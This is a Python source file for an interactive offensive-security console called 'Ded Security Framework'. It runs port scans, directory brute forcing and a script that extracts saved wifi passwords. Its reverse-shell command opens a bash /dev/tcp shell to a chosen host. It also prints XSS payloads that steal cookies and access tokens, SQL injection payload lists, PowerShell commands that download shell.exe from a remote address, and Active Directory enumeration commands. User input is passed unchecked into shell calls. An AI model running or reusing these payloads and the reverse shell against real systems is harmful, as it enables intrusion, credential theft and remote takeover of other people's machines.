__author__ = 'Simon Kinjo'
__version__ = '2.3'
__name__ = 'Ded Security Framework'

import os
import requests
import base64
import platform
import webbrowser
import subprocess
from base64 import urlsafe_b64encode, urlsafe_b64decode
from requests.models import encode_multipart_formdata


banner = """
 @@@@@@@  @@@@@@@@ @@@@@@@        @@@@@@ @@@@@@@@  @@@@@@@ @@@  @@@ @@@@@@@  @@@ @@@@@@@ @@@ @@@
 @@!  @@@ @@!      @@!  @@@      !@@     @@!      !@@      @@!  @@@ @@!  @@@ @@!   @@!   @@! !@@
 @!@  !@! @!!!:!   @!@  !@!       !@@!!  @!!!:!   !@!      @!@  !@! @!@!!@!  !!@   @!!    !@!@! 
 !!:  !!! !!:      !!:  !!!          !:! !!:      :!!      !!:  !!! !!: :!!  !!:   !!:     !!:  
 :: :  :  : :: ::: :: :  :       ::.: :  : :: :::  :: :: :  :.:: :   :   : : :      :      .:   
                     www.dedsecurity.com                                                                                       
"""

print(banner)

print(f"\033[33m[{__name__} v{__version__}, {__author__}]\033[m")

google_hacking = 'https://www.google.com/search?q='

def help():
    print("""
Commands:
---------------------------------
help - Displays this menu
exit - To exit
clear - Linux
cls - Windows 
robots - Get robots.txt  
speciport - Shows specific ports 
curl - Website source code
banner - Banner-Grabbing
portscan - Port-Scanner 
wifi - This software obtains the wifi passwords saved on the computer
subdomain - Shows the subdomains
whois - Consult contact information and DNS about entities on the internet
geoip - Feature that allows you to determine the geographic position of a device based on a coordinate system
traceroute - Traceroute is a diagnostic tool that tracks a packet's route through a computer network using IP and ICMP protocols
ping - Utility that uses the ICMP protocol to test connectivity between devices
google - Google Hacking
exploitdb - Google Hacking Database
login - Pages containing login portals
ondevice - Online devices
indexof - Index of a website
dmarc - Is a standard email authentication method. ... These reports contain information that identifies potential authentication issues and malicious activity in messages sent from your domain.
dirb - Brute force with multiple mass names and handles their return code identifying whether they are returned or not
listeningport - listening port to backdoor
dedsecurity - Ded Security Website
xss - Xss codes
reverseshell - Bash reverse shell
sqlinjection - Sql injection codes
encode - Base64 Encoder
decode - Base64 Decoder
powershellhandy - Powershell handy commands
webserver - A web server in Python
shell - Executes shell commands
pdb - Starts a Python Debugger session (dev only)
""")

def subdomain():
    domain = input("Website: ")

    file = open("network/listsubdomain.txt")
    content = file.read()
    subdomains = content.splitlines()

    discovered_subdomains = []
    for subdomain in subdomains:
        
        url = f"http://{subdomain}.{domain}"
        try:   
            requests.get(url)
        except requests.ConnectionError:
            
            pass
        else:
            
            print("subdomain:", url)
            discovered_subdomains.append(url)

def traceroute():
    t = input("Website/Ip: ")
    if platform.system() == 'Linux':
        os.system("traceroute "+t)
    elif platform.system() == 'Windows':
        os.system("tracert "+t)


def encode(data):
    return urlsafe_b64encode(bytes(data, 'utf-8'))

def decode(enc):
    return urlsafe_b64decode(enc).decode()

def webserver():
    if platform.system() == 'Linux':
        os.system("python3 -m http.server 8080")
    elif platform.system() == 'Windows':
        os.system("python -m http.server 8080")

def shell():
    ishell = input("> ")
    print("\033[34m[*] \033[mCommand: "+ishell)
    print(os.popen(ishell).read())

def pdb():
    import pdb
    pdb.set_trace()

print("Type 'help' to show commands.")

while True:
    i = input("\033[36mdedsecurity> \033[m")

    if i == "exit":
        break
    elif i == "clear":
        os.system("clear")
    elif i == "shell":
        shell()
    elif i == "cls":
        os.system("cls")
    elif i == "help":
        help()
    elif i == "robots":
        v = input("Website: ")
        robots = 'http://'+v+'/robots.txt'
        info = requests.get(robots)
        print(info.text)
    elif i == "speciport":
        p = input("Website/ip: ")
        os.system('python network/speciport.py '+p)# if you use Linux, switch to 'python3 network/speciport.py'
    elif i == "curl":
        c = input("Website[example:https://google.com]: ")
        os.system('deno run --allow-net network/curl.ts '+c)
    elif i == "banner":
        os.system('python network/banner_grabbing.py')# if you use Linux, switch to 'python3 network/banner_grabbing.py'
    elif i == "portscan":
        os.system('python network/scannernmap.py')# if you use Linux, switch to 'python3 network/scannernmap.py'
    elif i == "wifi":
        os.system('python network/wifi.pyw')# if you use Linux, switch to 'python3 network/wifi.pyw'
    elif i == "subdomain":
        subdomain()
    elif i == "whois":
        w = input("Website:")
        whois = 'https://api.hackertarget.com/whois/?q='+w
        info = requests.get(whois)
        print(info.text)
    elif i == "geoip":
        g = input("Website/Ip: ")
        geoip = 'https://api.hackertarget.com/geoip/?q='+g
        info = requests.get(geoip)
        print(info.text)
    elif i == "traceroute":
        traceroute()
    elif i == "ping":
        pi = input("Website/Ip: ")
        os.system("ping "+pi)
    elif i == "google":
        url = input("Website: ")
        webbrowser.open_new_tab(google_hacking + 'site:'+url)
    elif i == "exploitdb":
        webbrowser.open_new_tab('https://www.exploit-db.com/google-hacking-database')
    elif i == "login":
        lo = input("Website: ")
        webbrowser.open_new_tab(google_hacking + 'inurl:"/login.htm" site:'+lo)
    elif i == "ondevice":
        on = input("Website: ")
        webbrowser.open_new_tab(google_hacking + 'site:'+on+' /tcpipv4.htm')
    elif i == "indexof":
        index = input("Website: ")
        webbrowser.open_new_tab(google_hacking + 'intitle: "index of" site:'+index)
    elif i == "dmarc":
        dmarc = input("Url: ")
        os.system("host -t txt _dmarc."+dmarc)
    elif i == "dirb":
        urldirb = input("Url: ")
        os.system("dirb "+urldirb)
    elif i == "listeningport":
        ip = input("Ip: ")
        port = input("Port: ")
        os.system("sudo nc -l "+ip+" -p "+port+" -v")
    elif i == "dedsecurity":
        webbrowser.open_new_tab('https://www.dedsecurity.com')
    elif i == "reverseshell":
        ip = input("Ip: ")
        port = input("Port: ")
        os.system("bash -c 'exec bash -i &>/dev/tcp/"+ip+"/"+port+" <&1'")
    elif i == "xss":
        print("""
        Data grabber for XSS
        
        Obtains the administrator cookie or sensitive access token, the following payload will send it to a controlled page.
        
        <script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
        <script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
        <script>new Image().src='http://localhost/cookie.php?c='+document.cookie;</script>
        <script>new Image().src='http://localhost/cookie.php?c='+localStorage.getItem('access_token');</script>

        XSS in HTML/Applications
        
        Basic Payload

        <script>alert('XSS')</script>
        <s
        cr<script>ipt>alert('XSS')</scr<script>ipt>
        "><script>alert("XSS")</script>
        "><script>alert(String.fromCharCode(88,83,83))</script>
        
        Img tag payload
        
        <img src=x onerror=alert('XSS');>
        <img src=x onerror=alert('XSS')//
        <img src=x onerror=alert(String.fromCharCode(88,83,83));>
        <img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
        <img src=x:alert(alt) onerror=eval(src) alt=xss>
        "><img src=x onerror=alert("XSS");>
        "><img src=x onerror=alert(String.fromCharCode(88,83,83));>

        XSS in SVG (short)

        <svg xmlns='http://www.w3.org/2000/svg' onload='alert(document.domain)'/>
        <svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
        <svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
        <svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>

        Bypass word blacklist with code evaluation

        eval('ale'+'rt(0)');
        Function('ale'+'rt(1)')();
        new Function`alert`6``;
        setTimeout('ale'+'rt(2)');
        setInterval('ale'+'rt(10)');
        Set.constructor('ale'+'rt(13)')();
        Set.constructor`alert(14)```;
        """)
    elif i == "sqlinjection":
        print("""
        Generic SQL Injection Payloads

        ' or '
        -- or # 
        ' OR '1
        ' OR 1 -- -
        OR "" = "
        " OR 1 = 1 -- -"
        ' OR '' = '
        '='
        'LIKE'
        '=0--+
        OR 1=1
        ' OR 'x'='x
        ' AND id IS NULL; --
        '''''''''''''UNION SELECT '2

        Time-Based

        ,(select * from (select(sleep(10)))a)
        %2c(select%20*%20from%20(select(sleep(10)))a)
        ';WAITFOR DELAY '0:0:30'--
        Generic Error Based Payloads
        OR 1=1
        OR 1=1#
        OR x=y#
        OR 1=1-- 
        OR x=x-- 
        OR 3409=3409 AND ('pytW' LIKE 'pytW
        HAVING 1=1
        HAVING 1=1#
        HAVING 1=0-- 
        AND 1=1-- 
        AND 1=1 AND '%'='
        WHERE 1=1 AND 1=0--
        %' AND 8310=8310 AND '%'='

        Authentication Based Payloads

        ' or ''-'
        ' or '' '
        ' or ''&'
        ' or ''^'
        ' or ''*'
        or true--
        " or true--
        ' or true--
        ") or true--
        ') or true--
        admin') or ('1'='1'--
        admin') or ('1'='1'#
        admin') or ('1'='1'/

        Order by and UNION Based Payloads

        1' ORDER BY 1--+
        1' ORDER BY 2--+
        1' ORDER BY 3--+
        1' ORDER BY 1,2--+
        1' ORDER BY 1,2,3--+
        1' GROUP BY 1,2,--+
        1' GROUP BY 1,2,3--+
        ' GROUP BY columnnames having 1=1 --
        -1' UNION SELECT 1,2,3--+
        ' UNION SELECT sum(columnname ) from tablename --
        -1 UNION SELECT 1 INTO @,@
        -1 UNION SELECT 1 INTO @,@,@
        1 AND (SELECT * FROM Users) = 1 
        ' AND MID(VERSION(),1,1) = '5';
        ' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
        """)
    elif i == "encode":
        msg = input("msg: ")
        encode(msg)
        print(encode(msg))
    elif i == "decode":
        msgde = input("msg: ")
        decode(msgde)
        print(decode(msgde))
    elif i == "powershellhandy":
        print("""
        System enumeration

        systeminfo
        Get-WmiObject Win32_ComputerSystem
        echo "$env:COMPUTERNAME.$env:USERDNSDOMAIN"
        # List Security patches
        Get-Hotfix -description "Security update"
        wmic qfe get HotfixID,ServicePackInEffect,InstallDate,InstalledBy,InstalledOn
        # Environment Variables
        Get-ChildItem Env: | ft Key,Value
        (over cmd.exe)
        set

        HTTP download (wget like)

        Invoke-WebRequest "http://10.10.10.10/shell.exe" -OutFile "shell.exe" 
        # Cmd compatible
        certutil -urlcache -f http://10.10.10.10/shell.exe shell.exe

        WLAN enumeration

        netsh wlan show profiles
        netsh wlan show profile name="PROFILE-NAME" key=clear

        Active Directory enumeration

        Domain enumeration
        Get-NetDomain
        # List Forest Domains
        Get-NetForestDomain
        # Domain SID
        Get-DomainSID 
        # Domain Policy
        Get-DomainPolicy
        # Domain Organizational Units
        Get-NetOU
        # List trusted Domains
        Get-NetDomainTrust

        GPO enumeration

        # GPO applied to the machine
        Get-NetGPO -ComputerName computername.domain.com

        Password enumeration

        # Last Password Set date
        Get-UserProperty –Properties pwdlastset
        # Description of User object
        Find-UserField -SearchField Description –SearchTerm “pass”
        Computer enumeration
        # List Computers of the Domain

        Get-NetComputer

        # List Pingable Hosts
        Get-NetComputer -Ping
        # List Windows 7 Ultimate Computers
        Get-NetComputer –OperatingSystem "Windows 7 Ultimate"

        Admin groups and account enumeration

        # List Domain Admin members
        Get-NetGroupMember -GroupName "Domain Admins"
        # List Admin Groups
        Get-NetGroup *admin*
        # List Local Admins [need Administrative rights]
        Get-NetLocalGroup –ComputerName PCNAME-001
        # Get groups of user [need Administrative rights]
        Get-NetGroup –UserName "username"

        ACL enumeration

        # User ACL
        Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs
        # GPO modifications rights
        Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
        # Password reset rights
        Get-ObjectAcl -SamAccountName labuser -ResolveGUIDs -RightsFilter "ResetPassword"
        """)
    elif i == "webserver":
        webserver()
        print("Serving HTTP on :: port 8080")
    elif i == "pdb":
        pdb()
        
